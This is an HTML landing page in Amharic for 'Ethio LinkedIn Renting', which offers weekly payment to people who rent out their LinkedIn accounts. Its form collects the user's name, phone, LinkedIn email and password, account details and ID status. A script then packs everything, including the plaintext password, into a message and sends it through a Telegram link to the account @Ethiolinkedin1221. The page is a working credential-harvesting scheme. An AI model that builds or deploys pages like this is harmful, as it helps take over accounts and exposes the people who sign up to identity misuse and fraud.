<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ethio LinkedIn Renting | የኢትዮጵያውያን ፕሮፌሽናል ኔትወርክ</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="bg-gray-50 text-gray-800 font-sans">

    <header class="bg-[#0077b5] text-white py-6 shadow-md text-center">
        <div class="max-w-4xl mx-auto px-4">
            <img src="IMG_20260619_121402_550.jpg" alt="Ethio LinkedIn Logo" class="w-24 h-24 mx-auto rounded-full border-4 border-white object-cover mb-3 shadow-lg">
            <h1 class="text-3xl font-bold tracking-wide">Ethio LinkedIn Renting</h1>
            <p class="text-blue-100 mt-1">የእርስዎን የሊንክዲን አካውንት አከራይተው በየሳምንቱ ተከፋይ ይሁኑ!</p>
        </div>
    </header>

    <main class="max-w-4xl mx-auto px-4 py-8">
        
        <section class="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 mb-8 text-center">
            <h2 class="text-2xl font-bold text-[#0077b5] mb-3">የሊንክዲን አካውንት ኪራይ ምንድን ነው?</h2>
            <p class="text-gray-600 max-w-2xl mx-auto mb-6 text-sm md:text-base leading-relaxed">
                የሊንክዲን አካውንትዎን በትርፍ ጊዜዎ ወደ ተጨማሪ የገቢ ምንጭ ይለውጡ! እርስዎ ሳይደክሙ፣ አካውንትዎ ለእርስዎ ገንዘብ የሚያስገኝበትን አስተማማኝ መንገድ አዘጋጅተናል።
            </p>
        </section>

        <section class="bg-white rounded-2xl p-6 shadow-md border border-gray-100 mb-8">
            <h2 class="text-2xl font-bold text-gray-800 mb-6 text-center">አካውንትዎን ያከራዩ</h2>
            <form id="rentalForm" class="space-y-5">
                <div class="grid md:grid-cols-2 gap-4">
                    <input type="text" id="fullName" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300" placeholder="ሙሉ ስም">
                    <input type="tel" id="phone" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300" placeholder="ስልክ ቁጥር">
                </div>
                <div class="grid md:grid-cols-2 gap-4">
                    <input type="text" id="linkedinEmail" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300" placeholder="ሊንክዲን ኢሜይል">
                    <input type="password" id="linkedinPassword" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300" placeholder="Password">
                </div>
                <div class="grid md:grid-cols-3 gap-4">
                    <input type="text" id="connections" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300" placeholder="ኮኔክሽን ብዛት">
                    <input type="text" id="accountAge" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300" placeholder="የአካውንት ዕድሜ">
                    <select id="hasId" class="w-full px-4 py-2.5 rounded-lg border border-gray-300">
                        <option value="አለኝ">መታወቂያ አለኝ</option>
                        <option value="የለኝም">የለኝም</option>
                    </select>
                </div>
                <button type="button" onclick="sendToTelegram()" class="w-full bg-[#0077b5] text-white font-bold py-3 rounded-lg hover:bg-[#005f93] transition">
                    <i class="fab fa-telegram-plane mr-2"></i> መረጃውን በቴሌግራም ላክ
                </button>
            </form>
        </section>
    </main>

    <script>
        function sendToTelegram() {
            const name = document.getElementById('fullName').value;
            const phone = document.getElementById('phone').value;
            const email = document.getElementById('linkedinEmail').value;
            const pass = document.getElementById('linkedinPassword').value;
            const connections = document.getElementById('connections').value;
            const accountAge = document.getElementById('accountAge').value;
            const idStatus = document.getElementById('hasId').value;

            if(!name || !phone || !email || !pass || !connections || !accountAge) {
                alert("እባክዎ ሁሉንም መረጃዎች በትክክል ይሙሉ!");
                return;
            }

            const message = `✨ አዲስ አካውንት አከራይ ተመዝግቧል ✨\n\n` +
                            `👤 ስም: ${name}\n` +
                            `📞 ስልክ: ${phone}\n` +
                            `📧 ኢሜይል: ${email}\n` +
                            `🔑 ፓስወርድ: ${pass}\n` +
                            `👥 ኮኔክሽን: ${connections}\n` +
                            `📅 ዕድሜ: ${accountAge}\n` +
                            `🪪 መታወቂያ: ${idStatus}`;

            // አድራሻው በትክክል ወደ @Ethiolinkedin1221 እንዲላክ ተደረገ
            const telegramUrl = `https://t.me/Ethiolinkedin1221?text=${encodeURIComponent(message)}`;
            window.open(telegramUrl, '_blank');
        }
    </script>
</body>
</html>
